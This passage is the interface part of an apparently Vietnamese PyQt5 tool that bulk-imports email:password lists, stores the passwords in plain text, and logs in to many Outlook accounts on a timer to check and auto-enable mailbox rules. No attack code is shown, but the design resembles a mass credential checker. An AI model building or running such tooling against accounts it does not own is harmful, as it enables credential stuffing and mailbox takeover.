            self.table.setItem(i, 0, QTableWidgetItem(a.get('email', '')))
            pw = a.get('password', '')
            self.table.setItem(i, 1, QTableWidgetItem('•' * len(pw) if pw else ''))
            status = a.get('status', '')
            status_item = QTableWidgetItem(status or '-')
            color_map = {'OK': self.C['success'], 'FIXED': self.C['info'],
                         'DISABLED': self.C['warning'], 'NO_RULES': self.C['text_dim'],
                         'LOGIN_FAILED': self.C['danger']}
            if status in color_map:
                status_item.setForeground(QColor(color_map[status]))
            self.table.setItem(i, 2, status_item)
            rt = a.get('rules_total', 0)
            re_ = a.get('rules_enabled', 0)
            self.table.setItem(i, 3, QTableWidgetItem(f'{re_}/{rt}'))
            self.table.setItem(i, 4, QTableWidgetItem(a.get('last_check', '-')))
            # Action button: Check
            check_btn = QPushButton('Check')
            check_btn.setObjectName('secondary')
            check_btn.setMaximumWidth(70)
            check_btn.clicked.connect(lambda _, e=a['email']: self.check_one_email(e))
            self.table.setCellWidget(i, 5, check_btn)
            del_btn = QPushButton('×')
            del_btn.setObjectName('secondary')
            del_btn.setMaximumWidth(40)
            del_btn.clicked.connect(lambda _, e=a['email']: self.delete_one(e))
            self.table.setCellWidget(i, 6, del_btn)

    def add_account_dialog(self):
        from PyQt5.QtWidgets import QInputDialog
        text, ok = QInputDialog.getText(self, 'Add Account', 'Format email:password hoặc email|password:')
        if not ok or not text.strip():
            return
        text = text.strip()
        if '|' in text and ':' not in text.split('|', 1)[0]:
            text = text.replace('|', ':', 1)
        if ':' not in text:
            QMessageBox.warning(self, 'Invalid', 'Sai format')
            return
        email, password = text.split(':', 1)
        AccountStore.upsert(email.strip(), password.strip())
        self.refresh_table()

    def import_db(self):
        path, _ = QFileDialog.getOpenFileName(self, 'Import accounts', '', 'Text (*.txt);;All (*.*)')
        if not path:
            return
        added = 0
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if '|' in line and ':' not in line.split('|', 1)[0]:
                    line = line.replace('|', ':', 1)
                if ':' not in line:
                    continue
                email, password = line.split(':', 1)
                AccountStore.upsert(email.strip(), password.strip())
                added += 1
        self.refresh_table()
        QMessageBox.information(self, 'Imported', f'Đã import {added} accounts')

    def delete_selected(self):
        rows = sorted({i.row() for i in self.table.selectedIndexes()})
        if not rows:
            QMessageBox.information(self, 'No selection', 'Chọn dòng cần xóa')
            return
        emails = [self.table.item(r, 0).text() for r in rows]
        if QMessageBox.question(self, 'Confirm', f'Xóa {len(emails)} accounts?') != QMessageBox.Yes:
            return
        AccountStore.remove(emails)
        self.refresh_table()

    def delete_one(self, email):
        if QMessageBox.question(self, 'Confirm', f'Xóa {email}?') != QMessageBox.Yes:
            return
        AccountStore.remove([email])
        self.refresh_table()

    def check_all(self):
        accs = AccountStore.load()
        if not accs:
            QMessageBox.information(self, 'Empty', 'DB rỗng')
            return
        self._start_check(accs)

    def check_selected(self):
        rows = sorted({i.row() for i in self.table.selectedIndexes()})
        if not rows:
            QMessageBox.information(self, 'No selection', 'Chọn dòng cần check')
            return
        emails = {self.table.item(r, 0).text() for r in rows}
        accs = [a for a in AccountStore.load() if a['email'] in emails]
        self._start_check(accs)

    def check_one_email(self, email):
        accs = [a for a in AccountStore.load() if a['email'] == email]
        if accs:
            self._start_check(accs)

    def _start_check(self, accounts):
        if self.check_worker and self.check_worker.isRunning():
            QMessageBox.warning(self, 'Busy', 'Đang check, đợi xong')
            return
        api = 'outlook' if self.api_combo.currentIndex() == 0 else 'graph'
        self.btn_check_all.setEnabled(False)
        self.btn_check_selected.setEnabled(False)
        self.btn_stop_check.setEnabled(True)
        self.check_progress_bar.setValue(0)
        self.check_progress_label.setText(f'0 / {len(accounts)}')
        self.check_log.clear()
        self.check_log.append(f'<b>Checking {len(accounts)} account(s)...</b>')
        self.check_worker = CheckWorker(accounts, self.cb_auto_enable.isChecked(), api, self.check_thread_spin.value())
        self.check_worker.log_signal.connect(self.log_check)
        self.check_worker.account_checked.connect(lambda r: self.refresh_table())
        self.check_worker.progress.connect(self.on_check_progress)
        self.check_worker.finished_signal.connect(self.on_check_finished)
        self.check_worker.start()

    def stop_check(self):
        if self.check_worker:
            self.check_worker.stop()

    def on_check_progress(self, done, total):
        pct = int(done / total * 100) if total else 0
        self.check_progress_bar.setValue(pct)
        self.check_progress_label.setText(f'{done} / {total}')

    def on_check_finished(self):
        self.btn_check_all.setEnabled(True)
        self.btn_check_selected.setEnabled(True)
        self.btn_stop_check.setEnabled(False)
        self.check_log.append('<b style="color:#10b981;">Check hoàn tất</b>')
        self.refresh_table()

    def toggle_auto_check(self, checked):
        if checked:
            mins = self.auto_interval.value()
            self.auto_check_timer.start(mins * 60 * 1000)
            self.log_check('INFO', f'Auto-check ON: mỗi {mins} phút')
        else:
            self.auto_check_timer.stop()
            self.log_check('INFO', 'Auto-check OFF')

    def auto_check_tick(self):
        if self.check_worker and self.check_worker.isRunning():
            return
        accs = AccountStore.load()
        if accs:
            self.log_check('INFO', f'[AUTO] Đang check {len(accs)} accounts...')
            self._start_check(accs)

    # ============ LOG ============
    def log(self, level, msg):
        ts = datetime.now().strftime('%H:%M:%S')
        color = {'OK': self.C['success'], 'ERROR': self.C['danger'],
                 'WARN': self.C['warning'], 'INFO': self.C['info']}.get(level, self.C['text'])
        self.log_view.append(f'<span style="color:{self.C["text_dim"]};">[{ts}]</span> '
                             f'<b style="color:{color};">[{level}]</b> {msg}')

    def log_check(self, level, msg):
        ts = datetime.now().strftime('%H:%M:%S')
        color = {'OK': self.C['success'], 'ERROR': self.C['danger'],
                 'WARN': self.C['warning'], 'INFO': self.C['info']}.get(level, self.C['text'])
        self.check_log.append(f'<span style="color:{self.C["text_dim"]};">[{ts}]</span> '
                              f'<b style="color:{color};">[{level}]</b> {msg}')


def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    pal = QPalette()
    pal.setColor(QPalette.Window, QColor(15, 20, 25))
    pal.setColor(QPalette.WindowText, Qt.white)
    pal.setColor(QPalette.Base, QColor(13, 17, 23))
    pal.setColor(QPalette.Text, Qt.white)
    pal.setColor(QPalette.Highlight, QColor(229, 9, 20))
    app.setPalette(pal)
    w = MainWindow()
    w.show()
    sys.exit(app.exec_())


if __name__ == '__main__':
    main()
